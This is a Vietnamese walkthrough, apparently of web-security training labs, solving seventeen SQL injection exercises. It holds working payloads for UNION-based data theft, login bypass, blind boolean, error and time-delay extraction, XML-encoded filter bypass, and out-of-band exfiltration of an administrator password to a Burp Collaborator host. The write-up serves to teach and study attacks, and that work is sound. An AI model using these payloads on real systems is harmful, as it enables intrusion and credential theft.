# 1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Truy cập category 'Pets' ta thấy URL có dạng `/filter?category=Pets`

Test lỗi SQL injection: `/filter?category=Pets'--`. Kết quả trả về thành công, như vậy trang web có lỗ hổng SQLi ở chức năng search theo category

Để show thông tin tất cả các category, ta thay đổi URL thành `filder?category=Pets'+or+'1'='1`. Kết quả trả về thành công.

# 2. SQL injection vulnerability allowing login bypass
Thử dùng username `administrator'--` để đăng nhập. Nếu có lỗi SQL injection, câu query sinh ra sẽ bỏ qua việc xác thực password. 

Sau khi submit, ta thu được kết quả thành công.

# 3. SQL injection UNION attack, determining the number of columns returned by the query
Trong chức năng tìm kiếm theo category của website, URL có dạng `/filter?category=Gifts`

Ta thay đổi URL thành `/filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL` thì thấy kết quả trả về thành công. Như vậy có 3 cột được trả về trong câu truy vấn (tương ứng với 3 giá trị NULL)

# 4. SQL injection UNION attack, finding a column containing text
Trong chức năng tìm kiếm theo category của website, URL có dạng `/filter?category=Lifestyle`

Ta thay đổi URL thành `/filter?category=Lifestyle%20UNION%20SELECT%20NULL,NULL,NULL--` thì thấy kết quả trả về thành công. Như vậy có 3 cột được trả về từ câu truy vấn. Tiếp theo, ta cần tìm column chứa kiểu dữ liệu string.

Thay lần lượt từng giá trị NULL thành `%27a%27`, ta thấy với URL `filter?category=Lifestyle%27%20UNION%20SELECT%20NULL,%27a%27,NULL--` thì không bị lỗi "Internal Server Error". Như vậy column thứ 2 chính là column ta cần tìm.

# 5. SQL injection UNION attack, retrieving data from other tables
Chức năng search theo category của website có lỗi SQLi. 

Ta thay URL thành `/filter?category=Accessories%27%20UNION%20SELECT%20NULL,NULL%20FROM%20users--`. Kêt quả thành công, như vậy có 2 column được trả về

Thay URL thành `/filter?category=Accessories%27%20UNION%20SELECT%20%27a%27,%27a%27%20FROM%20users--`. Kết quả thành công, như vậy cả hai column đó đều có kiểu dữ liệu string.

Thay URL thành `/filter?category=Accessories%27%20UNION%20SELECT%20username,password%20FROM%20users--` thì thấy username và password của administrator đã xuất hiện như trong hình

![image](https://user-images.githubusercontent.com/103978452/201867157-34622c44-2e40-4672-86bd-a0f9211f0010.png)

Dùng thông tin đã có để đăng nhập, kết quả thành công.

# 6. SQL injection UNION attack, retrieving multiple values in a single column
Chức năng search theo category của website có lỗi SQLi.

Ta thay URL thành `/filter?category=Pets%27%20UNION%20SELECT%20NULL,%27a%27--`. Kết quả trả về không có lỗi, như vậy câu query có 2 column được trả về.

Thay URL thành `/filter?category=Pets%27%20UNION%20SELECT%20NULL,%27a%27--`, kết quả trả về không có lỗi. Trong khi đó, nếu cũng thay giá trị NULL còn lại thành `%27a%27` thì lại xuất hiện lỗi. Như vậy chỉ có column thứ 2 có kiểu dữ liệu string.

Để lấy username, ta thay đổi URL thành `/filter?category=Pets%27%20UNION%20SELECT%20NULL,username%20FROM%20users--`. 

![image](https://user-images.githubusercontent.com/103978452/201869031-2f95a213-131d-4c13-abb8-068e8bada6c4.png)

Để lấy password của administrator, ta thay URL thành `/filter?category=Pets%27%20UNION%20SELECT%20NULL,password%20FROM%20users%20where%20username=%27administrator%27--`.

![image](https://user-images.githubusercontent.com/103978452/201936283-bfdb10e0-3da9-4ea0-afe6-c7d2f6233463.png)

Sử dụng username và password thu được để đăng nhập, kết quả thành công.

# 7. SQL injection attack, querying the database type and version on Oracle
Chức năng search theo category của website có lỗi SQLi.

Ta thay URL thành `/filter?category=Gifts%27%20UNION%20SELECT%20NULL,NULL%20from%20dual--` thì thấy không có thông báo lỗi. Như vậy query trả về 2 column.

Ta thấy khi thay giá trị `NULL` thứ 2 thành `%27a%27` thì không có lỗi. Như vậy tại column thứ 2 có kiểu dữ liệu string.

Để lấy version của Oracle, ta thay URL thành `/filter?category=Gifts%27%20UNION%20SELECT%20NULL,banner%20from%20v$version--`. Kết quả trả về thành công.

![image](https://user-images.githubusercontent.com/103978452/201870472-ba3cc893-04bb-4d21-8835-931e3c83c252.png)

# 8. SQL injection attack, querying the database type and version on MySQL and Microsoft
Chức năng search theo category của website có lỗi SQLi. Khi thay URL thành `/filter?category=Gifts%27--` thì kết quả trả về lỗi. Nhưng dùng URL `/filter?category=Gifts%27%23` thì lại thành công. Như vậy database được sử dụng là MySQL.

Thay URL thành `/filter?category=Gifts%27%20UNION%20SELECT%20NULL,NULL%23` thì kết quả không có lỗi, như vậy query trả về 2 column.

Thay URL thành `/filter?category=Gifts%27%20UNION%20SELECT%20NULL,%27a%27%23` thì kết quả không có lỗi, như vậy column thứ hai có kiểu dữ liệu string.

Thay URL thành `/filter?category=Gifts%27%20UNION%20SELECT%20NULL,@@version%23`, ta thu được thông tin version của database.

![image](https://user-images.githubusercontent.com/103978452/201872385-d99883a4-4dbd-4edf-b54c-e9579ecec1ec.png)

# 9. SQL injection attack, listing the database contents on non-Oracle databases
Chức năng search theo category của website có lỗi SQLi. Khi thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20%27a%27,%27a%27--` thì kết quả trả về không có lỗi. Như vậy câu query trả về 2 column và cả hai đều có kiểu dữ liệu string.

Để lấy tên table chứa thông tin login, ta thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20table_type,table_name%20FROM%20information_schema.tables--`. Tìm kiếm trong các kết quả trả về, ta thấy có một table có tên là "users_vtwdxr" có thể là table chứa thông tin đăng nhập mà ta cần tìm:

![image](https://user-images.githubusercontent.com/103978452/201873823-b304e25c-3057-41c4-ad40-919f88a54137.png)

Để lấy các trường có trong table đó, ta thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20column_name,data_type%20FROM%20information_schema.columns%20where%20table_name=%27users_vtwdxr%27--`. Trong các kết quả trả về ta thấy hai trường đáng chú ý là "username_jfwaxj" và "password_wvyxlu".

![image](https://user-images.githubusercontent.com/103978452/201874596-aac50c94-7456-49a9-8896-cddb5f4a5440.png)

Liệt kê các giá trị của hai trường này trong table "users_vtwdxr" bằng cách thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20username_jfwaxj,password_wvyxlu%20FROM%20users_vtwdxr--`. Username và password của administrator đã xuất hiện:

![image](https://user-images.githubusercontent.com/103978452/201874561-2bf063bf-ce79-4d7e-b596-d363a5cc8365.png)

Sử dụng thông tin đã có để đăng nhập, thu được kết quả thành công.

# 10. SQL injection attack, listing the database contents on Oracle
Chức năng search theo category của website có lỗi SQLi, database sử dụng là Oracle. Khi ta thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20%27a%27,%27a%27%20FROM%20dual--` thì kết quả thành công. Như vậy câu query trả về 2 columns và cả hai đều có kiểu dữ liệu string.

Để xem danh sách các tables, ta thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20table_name,NULL%20FROM%20all_tables--`. Trong số kết quả có được, có table "USERS_HJWWRD" có khả năng là table chứa thông tin đăng nhập của users.

![image](https://user-images.githubusercontent.com/103978452/201877077-2d994530-6a2f-4869-a719-2a04b239a683.png)

Để xem danh sách các trường trong table "USERS_HJWWRD", ta thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20column_name,data_type%20FROM%20all_tab_columns%20where%20table_name=%27USERS_HJWWRD%27--`. Ta chú ý đến hai trường "USERNAME_SAMKHP" và "PASSWORD_TOTGCL".

![image](https://user-images.githubusercontent.com/103978452/201877349-69289e28-854a-4449-b6c8-57c8430bff08.png)

SELECT tất cả các giá trị trong hai columns "USERNAME_SAMKHP" và "PASSWORD_TOTGCL" bằng cách thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20USERNAME_SAMKHP,PASSWORD_TOTGCL%20FROM%20USERS_HJWWRD--`, ta thu được username và password của administrator.

![image](https://user-images.githubusercontent.com/103978452/201877501-415166ea-7846-4938-9147-3f19be65075f.png)

Sử dụng thông tin đã có để đăng nhập, kết quả thành công.

# 11. Blind SQL injection with conditional responses
Chức năng tracking của website có lỗi SQLi.

Khi thay đổi TrackingId thành `ah7mfSgFKxjX3Exh' and 1=(select case when(1=1) then 1 else 2 end)--` thì dòng "Welcome back" được hiển thị, còn nếu thay đổi `1=1` thành `1=2` thì lại không xuất hiện. Như vậy ta sẽ tấn công sử dụng conditional responses.

![image](https://user-images.githubusercontent.com/103978452/201892778-461be474-8dec-463a-823d-b4c18580e821.png)

Thay đổi TrackingId thành `ah7mfSgFKxjX3Exh' and 1=(select case when length(password)=10 then 1 else 2 end)--` rồi thực hiện bruteforce với độ dài password từ 1 đến 30. Ta thấy chỉ với length=20 thì dòng "Welcome back" mới xuất hiện.

![image](https://user-images.githubusercontent.com/103978452/201893944-f1d76799-4488-44aa-9b2f-6cf6b195a259.png)

Thay đổi TrackingId thành `ah7mfSgFKxjX3Exh' and 1=(select case when substring(password,1,1)='a' then 1 else 2 end from users where username='administrator')--` rồi tiến hành bruteforce với các giá trị từ a-z, 0-9. Ta thấy chỉ với giá trị 'm' thì "Welcome back" mới xuất hiện. Như vậy ký tự đầu tiên của password là 'm'.

![image](https://user-images.githubusercontent.com/103978452/201895967-446f92d4-b59f-4eb9-b061-6632785f5944.png)

Tiến hành tương tự với các ký tự còn lại từ 2 đến 20, ta thu được password là "mqljyhp93s7hu2zqpmid". Sử dụng thông tin thu được để đăng nhập, kết quả thành công.

# 12. Blind SQL injection with conditional errors
Chức năng tracking của website có lỗi SQLi.

Ta thay đổi cookie TrackingId thành `tjUeQ8E2Evymji7b' and 1=(select case when (1=1) then to_char(1/0) else null end from dual)--` thì thấy kết quả trả về lỗi, còn nếu thay `1=1` thành `1=0` thì sẽ không hiển thị lỗi. Như vậy ta sẽ tấn công sử dụng conditional errors.

![image](https://user-images.githubusercontent.com/103978452/201891180-f9f5e10c-b51c-49ea-9f88-671fb8e270e1.png)

Thay cookie TrackingId thành `tjUeQ8E2Evymji7b' and 1=(select case when length(password)=10 then to_char(1/0) else null end from users where username='administrator')--` rồi thực hiện bruteforce với độ dài của password, ta thấy chỉ với length=20 thì kết quả trả về error.

![image](https://user-images.githubusercontent.com/103978452/201885945-0373c361-109b-4a37-9575-f20d1e7736bb.png)

Thay đổi cookie TrackingId thành `tjUeQ8E2Evymji7b' and 1=(select case when substr(password,1,1)='a' then to_char(1/0) else null end from users where username='administrator')--` rồi tiến hành bruteforce với các giá trị từ a-z, 0-9. Ta thấy chỉ với ký tự 'f' thì mới xuất hiện lỗi. Như vậy ký tự đầu tiên của password là 'f'.

![image](https://user-images.githubusercontent.com/103978452/201889390-0037c0b0-8e52-4253-872d-66e074efeb18.png)

Thực hiện tương tự với `substr(password,2,1)`, `substr(password,3,1)`, ... đến `substr(password,20,1)`, cuối cùng ta thu được password="f4l51zsvc29fylpb93sa".

Sử dụng thông tin đã có để đăng nhập, kết quả thành công.

# 13. Blind SQL injection with time delays
Thay đổi cookie TrackingId thành `89d7JFSK1gQf8Kja'%3bSELECT pg_sleep(10)--`, response bị delay 10s.

![image](https://user-images.githubusercontent.com/103978452/201924259-1c1de137-30e6-440e-9c73-ac9e2a575efc.png)

# 14. Blind SQL injection with time delays and information retrieval
Thêm `'%3bSELECT pg_sleep(10)--` vào sau cookie TrackingId, kết quả bị delay 10s. Như vậy website có lỗi SQLi.

Thêm `'%3bSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE 'a' END--` vào sau TrackingId, ta thấy bị delay 10s. Nhưng khi thay đổi `1=1` thành `1=2` thì không bị delay. Như vậy ta sẽ dùng lệnh SELECT CASE WHEN để exploit

Bruteforce độ dài password: Thêm `'%3bSELECT CASE WHEN length(password)=10 THEN pg_sleep(5) ELSE 'a' END FROM users WHERE username='administrator'--` vào sau TrackingId rồi tiến hành bruteforce, ta thấy chỉ với length=20 thì thời gian nhận response lên tới 5 giây. Như vậy độ dài password là 20.

![image](https://user-images.githubusercontent.com/103978452/201925671-f7c85e19-0f97-4bb0-b4e8-d321e055003c.png)

Bruteforce password: Thêm `'%3bSELECT CASE WHEN substr(password,1,1)='a' THEN pg_sleep(8) ELSE 'a' END FROM users WHERE username='administrator'--` vào sau TrackingId, ta thấy chỉ với ký tự 'a' thì response trả về lên tới 8 giây. Như vậy password bắt đầu với 'a'.

![image](https://user-images.githubusercontent.com/103978452/201926618-606202b4-bc13-4df9-8f83-6c3f6f5a2551.png)

Tiến hành tương tự với các ký tự từ 2 đến 20, ta thu được password=afwrv9geoqal4yozoxw0. Sử dụng username và password có được để đăng nhập, kết quả thành công.

# 15. Blind SQL injection with out-of-band interaction
(Lưu ý: các đoạn code bên dưới trong thực tế đều được URL encode)

Thử thực hiện DNS lookup với trường hợp database là Oracle:

Thay đổi cookie TrackingId thành:
```
TrackingId=abc';SELECT EXTRACTVALUE(xmltype('
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://gk4lihowe69pkkgl7fluaewn0e65zto.oastify.com/"> %remote;]>
'),'/l') FROM dual--
```

Kiểm tra trong Burp Collaborator client, không có gì được hiển thị. Có thể website đã chặn việc thực thi nhiều câu lệnh query trong chức năng tracking. Như vậy, ta thay `';` thành `' UNION` rồi thử lại, kết quả câu lệnh query trở thành:

```
TrackingId=abc' UNION SELECT EXTRACTVALUE(xmltype('
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://gk4lihowe69pkkgl7fluaewn0e65zto.oastify.com/"> %remote;]>
'),'/l') FROM dual--
```

Kiểm tra, ta thấy đoạn query được thực thi thành công và trong Burp Collaborator đã nhận được request.

![image](https://user-images.githubusercontent.com/103978452/202646694-d96b5591-b9d3-4587-8e31-92ee12948b39.png)

# 16. Blind SQL injection with out-of-band data exfiltration
(Lưu ý: các đoạn code bên dưới trong thực tế đều được URL encode)

Thử với payload như trong bài #15, ta thấy kết quả vẫn thành công. Như vậy database được sử dụng là Oracle.

Payload ban đầu:
```
TrackingId=abc' UNION SELECT EXTRACTVALUE(xmltype('
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://.xde2byhd7n26d1920web3vp4tvzmwal.oastify.com"> %remote;]>
'),'/l') FROM dual--
```

Ta thay đổi payload thành:
```
TrackingId=abc' UNION SELECT EXTRACTVALUE(xmltype('
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||'helloworld'||'.xde2byhd7n26d1920web3vp4tvzmwal.oastify.com"> %remote;]>
'),'/l') FROM dual--
```

Chú ý đoạn URL đã được sửa đổi, bằng cách đặt "helloworld" làm subdomain. Khi kiểm tra BurpCollaborator, ta thấy một request đã được gửi đến, có chứa đoạn text "helloworld"

![image](https://user-images.githubusercontent.com/103978452/202651658-09315bc1-60ca-4632-9174-f933a2ec9c45.png)

Để lấy password của administrator, ta sẽ thay đoạn `"helloword"` thành `(SELECT password FROM users WHERE username="administrator")`. Sau khi gửi request, kiểm tra Burp Collaborator client thì thấy một đoạn subdomain đã được thêm vào. Đó chính là password của administrator.

![image](https://user-images.githubusercontent.com/103978452/202649060-fb5382f5-b0db-49bc-9437-45cd09480782.png)

Sử dụng thông tin đã có để đăng nhập, kết quả thành công.

# 17. SQL injection with filter bypass via XML encoding
Dùng BurpSuite để bắt request check stock. Ta thấy phần body của request là một đoạn XML gồm productId và storeId. Khi ta thêm `&#45;&#45;` (tương ứng -- khi XML encode) vào sau storeId, kết quả trả vễ vẫn như bình thường. Như vậy, website có lỗ hổng SQLi.

Khi ta thêm `&#32;UNION&#32;SELECT&#32;NULL&#45;&#45;` vào sau storeId, ta thấy giá trị null được trả về. Như vậy ta hoàn toàn có thể exploit bằng lệnh UNION. 

![image](https://user-images.githubusercontent.com/103978452/201933578-b6ca45f0-3cd3-473b-a163-14160c6b64a3.png)

Để lấy password của administrator, ta thêm `&#32;UNION&#32;SELECT&#32;password&#32;from&#32;users&#32;where&#32;username&#61;&#39;administrator&#39;&#45;&#45;` (tương ứng " UNION SELECT password where username='administrator') vào sau storeId

![image](https://user-images.githubusercontent.com/103978452/201935676-a466eb13-300e-4f76-a66e-bb7ac2618af5.png)

Sử dụng thông tin đã có để login, ta được kết quả thành công.
